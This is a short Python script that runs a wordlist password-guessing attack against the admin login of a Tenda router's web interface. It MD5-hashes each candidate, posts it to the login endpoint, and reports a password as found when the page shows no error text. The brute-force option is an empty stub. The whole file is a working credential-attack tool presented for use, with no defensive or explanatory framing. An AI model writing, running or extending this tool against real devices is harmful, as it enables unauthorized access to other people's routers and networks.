import requests
import hashlib
def hash_password(password):
    return hashlib.md5(password.encode('utf-8')).hexdigest().lower()

error1='Incorrect password'
error2='Forgot password'
error3='forget your password'
url='http://tendawifi.com/login/Auth'
username='admin'



def check_password(password):
    session=requests.Session()
    hashed_password=hash_password(password)
    data={'username':username,'password':hashed_password}
    response=session.post(url,data=data)
    text=response.text
    if error1 in text or error2 in text or error3 in text or len(text)<100:
        print(f"debug:{response.text}")
        return False
    return True

if __name__ == '__main__':
    contor=1
    verbose=True
    choice1=input("0 for wordlist attack, anything else --> brute force: ")
    if '0' in choice1:
        choice1=choice1.strip()
    if choice1=='0':
        path=input("Enter wordlist path: ").strip()
        with open(path,'r') as wordlist:
            for word in wordlist:
                word=word.strip()
                ok=check_password(word)
                if not ok:
                    if not verbose:
                        continue
                    print(f"{contor} tried incorrect password: {word}")
                    contor+=1
                else:
                    print(f"{contor} FOUND VALID PASSWORD:{word}")
                    exit()
        print(f"Worlist {path} exhausted, password not found.")
                    
    else:
        pass 
                
